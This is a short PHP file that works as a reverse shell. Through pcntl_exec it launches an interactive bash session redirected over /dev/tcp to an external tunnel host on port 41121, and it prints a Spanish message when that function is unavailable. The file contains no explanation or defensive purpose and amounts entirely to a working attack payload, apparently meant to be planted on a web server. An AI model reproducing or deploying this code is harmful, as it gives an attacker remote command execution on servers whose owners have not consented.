<?php
$cmd = '/bin/sh';
$args = array('-c', '/bin/bash -i >& /dev/tcp/bptuj-190-114-40-40.run.pinggy-free.link/41121 0>&1');

if (function_exists('pcntl_exec')) {
    pcntl_exec($cmd, $args);
} else {
    echo "pcntl_exec no está disponible.";
}
?>